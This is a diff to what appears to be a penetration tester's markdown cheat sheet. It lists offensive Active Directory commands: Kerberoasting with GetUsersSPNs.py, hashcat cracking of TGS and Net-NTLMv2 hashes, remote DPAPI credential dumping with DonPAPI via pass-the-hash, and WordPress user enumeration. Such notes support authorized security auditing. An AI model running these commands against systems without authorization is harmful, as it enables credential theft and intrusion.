@@ -94,16 +94,14 @@ KERBEROS
 - GetUsersSPNs.py -request -dc-ip <IP-DC> <domain.local>/<USER> -outputfile impacket_TGS_<IP>.txt
 
 # Crack TGS
-- hashcat -m 13100 -a 0 tgs.hash /usr/share/wordlists/rockyou.txt --force
+- hashcat -m 13100 hash.txt /home/audit/Documents/french -r d3adhob0.rule -O -w 3t
  
 ```
-
-``markdown
+```markdown
  CREDZ
 
 # Dump credz remotely with DPAPI Key (account should be a local admin account)
 - python3 DonPAPI.py --hashes <LM>:<NT> domain/user@target OR DonPAPI.py domain/user:passw0rd@target
- ``markdown
 
 # Net-NTLMv2 hash cracking
 -  hashcat -m 5600 hash.txt /home/audit/Documents/french -r d3adhob0.rule -O -w 3t
@@ -126,11 +124,6 @@ Enumeration
 - wpscan --url <URL> (-e u : to enumerate WP users)
 
 
-#
- 
- 
-#
- 
 
 # Crypto
 - ./testssl.sh -oA <filename> <URI>
@@ -142,7 +135,6 @@ Enumeration
  ```
  
  ## REVERSE
-
 
 
 ```markdown
